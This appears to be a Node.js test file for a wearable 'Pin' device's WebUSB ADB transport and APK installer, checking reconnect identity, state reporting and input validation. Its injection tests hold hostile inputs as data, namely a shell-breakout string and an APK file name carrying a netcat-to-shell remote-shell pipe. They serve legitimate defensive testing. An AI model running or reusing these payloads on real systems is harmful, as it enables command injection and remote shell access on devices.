import assert from "node:assert/strict";
import { register } from "node:module";
import test from "node:test";

/*
 * Ownership of the ONE Pin ADB session, driven rather than read.
 *
 * The Pin is physically attached to a wearer, and this transport is shared by
 * the whole browser tab: the installer, every settings pane, and the operator
 * shell all talk to the device through it. Two properties therefore have to
 * hold no matter how the session got into its current state.
 *
 *   1. A reconnect NEVER silently binds to a different device. `PinClient`
 *      object identity hangs off this transport and is what
 *      `settings/pin/_lib/useDeviceSettings.ts` uses as its per-device privacy
 *      boundary, so re-binding would read and write one wearer's device
 *      settings against another's Pin.
 *   2. Whoever observes the session is told when `adb`/`info` actually change.
 *      The transport reconnects ITSELF on a retryable socket close, so an
 *      observer bolted to a wrapper method never hears about that path and
 *      keeps reporting a device that has already been torn down.
 *
 * The real `WebUsbAdbSessionTransport` runs here. Only the two things that need
 * physical hardware are stubbed: the WebUSB device manager and the ADB
 * authentication handshake.
 */

// `src/lib/pin-device/adb/transport.ts` imports `../logging` the way the
// bundler resolves it; Node needs the extension spelled out for it.
register("./fixtures/source-resolve.mjs", import.meta.url);

const { AdbDaemonTransport } = await import("@yume-chan/adb");
const { AdbDaemonWebUsbDeviceManager } = await import(
  "@yume-chan/adb-daemon-webusb"
);
const { WebUsbAdbSessionTransport, pinBridgeSocketService } = await import(
  "../src/lib/pin-device/adb/transport.ts?pin-adb-session-test"
);

/**
 * A daemon transport `new Adb(...)` accepts.
 *
 * `shell_v2` is advertised so `adb.subprocess.shellProtocol` exists, and every
 * socket it then opens fails the way a yanked cable fails — "Socket closed" is
 * the exact string `recoverFromRetryableDisconnect` keys on.
 */
function fakeDaemonTransport(serial, { closeRejects = false } = {}) {
  return {
    serial,
    maxPayloadSize: 1024,
    banner: {
      product: "pin",
      model: "pin",
      device: "pin",
      features: ["shell_v2"],
    },
    disconnected: new Promise(() => {}),
    clientFeatures: ["shell_v2"],
    connect() {
      throw new Error("Socket closed");
    },
    addReverseTunnel() {},
    removeReverseTunnel() {},
    clearReverseTunnels() {},
    close() {
      return closeRejects
        ? Promise.reject(new Error("The device was disconnected."))
        : Promise.resolve();
    },
  };
}

function fakeDevice(serial, name = `Pin ${serial}`) {
  return {
    serial,
    name,
    connect: () =>
      Promise.resolve({
        writable: { close: () => Promise.resolve() },
        readable: { cancel: () => Promise.resolve() },
      }),
  };
}

const authStrategy = {
  createAuthenticationBundle: () =>
    Promise.resolve({ credentialStore: {}, authenticators: [] }),
};

/**
 * Install the two hardware stubs for the duration of `body`.
 *
 * `attached` is mutable so a test can unplug one Pin and plug in another
 * between calls, which is exactly the scenario that matters.
 */
async function withStubbedUsb(attached, body, { closeRejects = false } = {}) {
  const previousManager = AdbDaemonWebUsbDeviceManager.BROWSER;
  const previousAuthenticate = AdbDaemonTransport.authenticate;

  const requested = [];
  AdbDaemonWebUsbDeviceManager.BROWSER = {
    requestDevice: () => Promise.resolve(attached.devices[0] ?? undefined),
    getDevices: () => Promise.resolve([...attached.devices]),
  };
  AdbDaemonTransport.authenticate = ({ serial }) => {
    requested.push(serial);
    return Promise.resolve(fakeDaemonTransport(serial, { closeRejects }));
  };

  try {
    return await body({ requested });
  } finally {
    AdbDaemonWebUsbDeviceManager.BROWSER = previousManager;
    AdbDaemonTransport.authenticate = previousAuthenticate;
  }
}

test("reconnect refuses to bind a different Pin than the one that was authorized", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(attached, async ({ requested }) => {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });

    const info = await session.connect();
    assert.equal(info.serial, "PIN-A");

    // The wearer unplugs Pin A and a second Pin is attached in its place.
    attached.devices = [fakeDevice("PIN-B")];

    await assert.rejects(
      () => session.reconnect(),
      /previously authorized Pin \(PIN-A\) is no longer attached/,
      "a reconnect that cannot find the authorized serial must fail, not adopt whatever is plugged in",
    );

    // The decisive assertion: PIN-B was never authenticated, and the session
    // does not claim to be holding anything.
    assert.deepEqual(requested, ["PIN-A"]);
    assert.equal(session.connectionInfo, null);
  });

  // ...and the observer was told, so no surface can keep rendering "Connected".
  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected", "connecting", "error"],
  );
  assert.equal(changes.at(-1).info, null);
});

test("reconnect to the SAME Pin is observed, so derived state is rebuilt", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(attached, async ({ requested }) => {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });

    await session.connect();
    changes.length = 0;

    const info = await session.reconnect();
    assert.equal(info.serial, "PIN-A");
    assert.deepEqual(requested, ["PIN-A", "PIN-A"]);
  });

  /*
   * `idle` must NOT appear: the teardown inside a reconnect is an
   * implementation detail of one continuous "connecting" window, and
   * publishing idle would make the console clear its device-derived state
   * mid-operation. But `connecting` must appear, because that transition is
   * the only thing that tells a consumer keyed on the (unchanged) serial that
   * the tunnel and the PinClient behind it are gone.
   */
  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected"],
  );
});

test("a socket-closed operation recovers through the same observed path", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(attached, async () => {
    const session = new WebUsbAdbSessionTransport({
      authStrategy,
      onStateChange: (change) => changes.push(change),
    });
    await session.connect();
    changes.length = 0;

    // `shell()` fails the way a yanked cable fails; the transport reconnects
    // ITSELF here, which is the path no wrapper method ever sees.
    await assert.rejects(() => session.shell(["echo", "hi"]));
  });

  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected"],
    "the transport's own recovery must publish, or the store keeps reporting a session that was torn down",
  );
});

test("a disconnect whose close() rejects still releases the session", async () => {
  const attached = { devices: [fakeDevice("PIN-A")] };
  const changes = [];

  await withStubbedUsb(
    attached,
    async ({ requested }) => {
      const session = new WebUsbAdbSessionTransport({
        authStrategy,
        onStateChange: (change) => changes.push(change),
      });
      await session.connect();

      // Writing to an already-unplugged device rejects. That still means this
      // transport is finished.
      await session.disconnect();
      assert.equal(session.connectionInfo, null);

      // The bug this pins: with `adb`/`info` left set, `connect()`
      // short-circuited and reported the stale serial as Connected without
      // ever touching a device.
      await session.connect();
      assert.deepEqual(
        requested,
        ["PIN-A", "PIN-A"],
        "the next connect must really re-authenticate a device",
      );
    },
    { closeRejects: true },
  );

  assert.deepEqual(
    changes.map((change) => change.phase),
    ["connecting", "connected", "idle", "connecting", "connected"],
  );
});

/*
 * The installer's shell sinks.
 *
 * ADB has no execve-argv form: `transport.shell([...])` is joined with spaces
 * and handed to the device's shell as a STRING, so anything interpolated into
 * one is shell source. `/settings/pin/install` is an ungated wearer path whose
 * "Install APK File" flow takes a name straight from a `<input type="file">`,
 * which makes this reachable with a file someone else chose the name of.
 */
const { readdir, mkdtemp, rm } = await import("node:fs/promises");
const { execFile } = await import("node:child_process");
const { promisify } = await import("node:util");
const { join } = await import("node:path");
const runShell = promisify(execFile);

const {
  assertPackageManagerReady,
  isValidApkStagingName,
  stageSystemApkBatchInstall,
  waitForPackageManagerReady,
  waitForStagingProviderReady,
} = await import(
  "../src/lib/pin-device/adb/systemInstaller.ts?pin-adb-session-test"
);

test("package readiness requires a real absolute package path", async () => {
  const responses = [
    { stdout: "package:not found\n", stderr: "", exitCode: 0 },
    { stdout: "package: not found\n", stderr: "", exitCode: 0 },
    {
      stdout: "package:/system/framework/framework-res.apk\n",
      stderr: "",
      exitCode: 0,
    },
  ];
  let probes = 0;
  const transport = {
    async shell(command) {
      const text = Array.isArray(command) ? command.join(" ") : command;
      assert.equal(text, "cmd package path android");
      const response = responses[Math.min(probes, responses.length - 1)];
      probes += 1;
      return response;
    },
  };

  await waitForPackageManagerReady(transport, 1_000, 0, 0);

  assert.equal(probes, 3);
});

test("package readiness timeout preserves the last response and retry guidance", async () => {
  let probes = 0;
  const transport = {
    async shell(command) {
      const text = Array.isArray(command) ? command.join(" ") : command;
      assert.equal(text, "cmd package path android");
      probes += 1;
      throw new Error("ADB shell unavailable while Android is starting");
    },
  };

  await assert.rejects(
    () => waitForPackageManagerReady(transport, 20, 1, 0),
    (error) => {
      assert.match(error.message, /Timed out after 20ms/);
      assert.match(error.message, /wait for startup to finish, then retry/i);
      assert.match(error.message, /ADB shell unavailable while Android is starting/);
      return true;
    },
  );
  assert.ok(probes > 0);
});

test("package readiness bounds a probe that never returns", async () => {
  const startedAt = Date.now();
  const transport = {
    shell() {
      return new Promise(() => undefined);
    },
  };

  await assert.rejects(
    () => waitForPackageManagerReady(transport, 20, 1, 0),
    /wait for Android package service/,
  );
  assert.ok(Date.now() - startedAt < 500);
});

test("the pre-mutation package assertion probes once and fails closed", async () => {
  let probes = 0;
  const transport = {
    async shell(command) {
      assert.equal(command.join(" "), "cmd package path android");
      probes += 1;
      return {
        stdout: "",
        stderr: "cmd: Can't find service: package",
        exitCode: 20,
      };
    },
  };

  await assert.rejects(
    () => assertPackageManagerReady(transport, 20),
    /No package changes were started.*Can't find service: package/,
  );
  assert.equal(probes, 1);
});

test("a hostile value in a shell sink is inert on a real shell", async () => {
  const scratch = await mkdtemp(join(import.meta.dirname, "shellq-"));
  try {
    // `authority` is a parameter of an exported function, so this drives the
    // real interpolation path rather than a copy of it.
    const hostile = `evil'; touch INJECTED ;'`;
    let line = null;
    const transport = {
      shell(command) {
        line = Array.isArray(command) ? command.join(" ") : command;
        // Answer as a ready provider so the poll returns immediately.
        return Promise.resolve({ stdout: "", stderr: "", exitCode: 0 });
      },
    };

    await waitForStagingProviderReady(transport, hostile, 1_000, 10);
    assert.ok(line, "the provider probe must have issued a command");
    assert.match(line, /^sh -c /, "an interpolated command must go through sh -c");

    // Run exactly what adbd would run. `content` does not exist here, so the
    // command fails — the point is whether the INJECTED payload also ran.
    await runShell("/bin/sh", ["-c", line], { cwd: scratch }).catch(() => undefined);
    assert.deepEqual(
      await readdir(scratch),
      [],
      "the interpolated value executed as a command on the device's shell",
    );
  } finally {
    await rm(scratch, { recursive: true, force: true });
  }
});

test("an unusable APK file name is refused before any device I/O", async () => {
  const calls = [];
  const transport = {
    shell(command) {
      calls.push(["shell", command]);
      return Promise.resolve({ stdout: "", stderr: "", exitCode: 0 });
    },
    pushFile(path) {
      calls.push(["pushFile", path]);
      return Promise.resolve();
    },
  };

  for (const name of [
    "a.apk; toybox nc host 4444 | sh ;.apk",
    "has space.apk",
    "two,names.apk",
    "no-extension",
    "../escape.apk",
  ]) {
    assert.equal(isValidApkStagingName(name), false, name);
    await assert.rejects(
      () => stageSystemApkBatchInstall(transport, [{ apk: new Blob(["x"]), name }]),
      /is not a usable APK file name/,
      name,
    );
  }

  // The whole point of rejecting at the top: nothing was pushed, nothing ran.
  assert.deepEqual(calls, []);
  assert.equal(isValidApkStagingName("revival-server-1.2.3.apk"), true);
});

test("a session can only open the Pin's own two HTTP bridges", () => {
  // The capability that replaced a free-form `createSocket(service)`. A wearer
  // pane holding a session must not be able to name `shell:` — the service the
  // operator-only PTY is built on — or anything else.
  assert.equal(
    pinBridgeSocketService({ kind: "abstract" }),
    "localabstract:penumbra_http",
  );
  assert.equal(pinBridgeSocketService({ kind: "tcp", port: 8080 }), "tcp:8080");

  for (const port of [0, -1, 65536, 1.5, Number.NaN, "8080; shell:"]) {
    assert.throws(
      () => pinBridgeSocketService({ kind: "tcp", port }),
      /out-of-range Pin port/,
      String(port),
    );
  }
});
